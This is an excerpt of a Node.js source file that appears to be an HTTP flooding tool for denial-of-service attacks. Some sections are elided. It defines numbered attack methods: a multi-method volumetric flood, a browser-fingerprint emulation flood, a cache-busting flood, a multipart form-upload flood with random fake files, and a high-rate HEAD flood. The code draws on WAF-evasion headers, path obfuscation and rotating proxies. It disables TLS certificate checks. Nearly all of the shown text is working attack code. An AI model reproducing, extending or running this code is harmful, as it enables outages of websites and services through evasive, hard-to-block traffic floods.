...
const { generateEvasionHeaders, obfuscatePath, rand, USER_AGENTS } = require('./antiwaf');
const { getProxy, getProxyStats } = require('./proxy');
...
const httpsAgent = new https.Agent({ ...agentOpts, rejectUnauthorized: false });
...
// ═══════════════════════════════════════════════════
// METHOD 1: HTTP-FLOOD — Volumetric multi-method flood
// ═══════════════════════════════════════════════════
function httpFlood(target, duration) {
    return new Promise((resolve) => {
        ...
        function fire() {
            ...
            const opts = { agent: t.isHttps ? httpsAgent : httpAgent, hostname: t.hostname, port: t.port, path, method, headers, timeout: 5000, rejectUnauthorized: false };
            ...
            if (method === 'POST' || method === 'PUT' || method === 'PATCH') {
                req.write(randomString(randomInt(256, 4096)));
            }
            req.end();
...
// ═══════════════════════════════════════════════════
// METHOD 6: BROWSER-EMU — Full browser fingerprint flood
// ═══════════════════════════════════════════════════
function browserEmu(target, duration) {
    return new Promise((resolve) => {
        ...
        const secFetch = [
            ...
            { dest: 'script', mode: 'no-cors', site: 'same-origin', user: '?0' },
            { dest: 'style', mode: 'no-cors', site: 'same-origin', user: '?0' },
            { dest: 'image', mode: 'no-cors', site: 'cross-site', user: '?0' },
        ];

        function fire() {
            if (Date.now() >= end) return resolve();
            const sf = secFetch[Math.floor(Math.random() * secFetch.length)];
            const headers = generateEvasionHeaders(target);
            ...
            const opts = { agent: t.isHttps ? httpsAgent : httpAgent, hostname: t.hostname, port: t.port, path, method: 'GET', headers, timeout: 5000, rejectUnauthorized: false };
            const req = mod.request(opts, (res) => {
                STATS.totalRequests++; STATS.successfulRequests++;
                STATS.statusCodes[res.statusCode] = (STATS.statusCodes[res.statusCode] || 0) + 1;
                res.on('data', (chunk) => { STATS.bytesTransferred += chunk.length; });
...
// ═══════════════════════════════════════════════════
// METHOD 7: CACHE-BUST — CDN/cache bypass flood
// ═══════════════════════════════════════════════════
...
// ═══════════════════════════════════════════════════
// METHOD 8: MULTIPART-FLOOD — Multipart form abuse
// ═══════════════════════════════════════════════════
function multipartFlood(target, duration) {
    return new Promise((resolve) => {
        ...
        function fire() {
            ...
            let body = '';
            const fieldCount = randomInt(10, 50);
            for (let i = 0; i < fieldCount; i++) {
                body += `--${boundary}\r\n`;
                body += `Content-Disposition: form-data; name="${randomString(8)}"\r\n\r\n`;
                body += `${randomString(randomInt(64, 512))}\r\n`;
            }
            // Fake file upload field
            body += `--${boundary}\r\n`;
            body += `Content-Disposition: form-data; name="file"; filename="${randomString(8)}.bin"\r\n`;
            body += `Content-Type: application/octet-stream\r\n\r\n`;
            body += `${randomString(randomInt(1024, 8192))}\r\n`;
            body += `--${boundary}--\r\n`;
            ...
            const opts = { agent: t.isHttps ? httpsAgent : httpAgent, hostname: t.hostname, port: t.port, path: t.path, method: 'POST', headers, timeout: 5000, rejectUnauthorized: false };
            const req = mod.request(opts, (res) => {
                STATS.totalRequests++; STATS.successfulRequests++;
                STATS.statusCodes[res.statusCode] = (STATS.statusCodes[res.statusCode] || 0) + 1;
                res.on('data', (chunk) => { STATS.bytesTransferred += chunk.length; });
...
// ═══════════════════════════════════════════════════
// METHOD 9: HEAD-FLOOD — Lightweight but high-frequency
// ═══════════════════════════════════════════════════
function headFlood(target, duration) {
    return new Promise((resolve) => {
        ...
        function fire() {
            ...
            const headers = generateEvasionHeaders(target);
            const opts = { agent: t.isHttps ? httpsAgent : httpAgent, hostname: t.hostname, port: t.port, path, method: 'HEAD', headers, timeout: 3000, rejectUnauthorized: false };
            const req = mod.request(opts, (res) => {
                STATS.totalRequests++; STATS.successfulRequests++;
                STATS.statusCodes[res.statusCode] = (STATS.statusCodes[res.statusCode] || 0) + 1;
                res.on('end', () => setImmediate(fire));
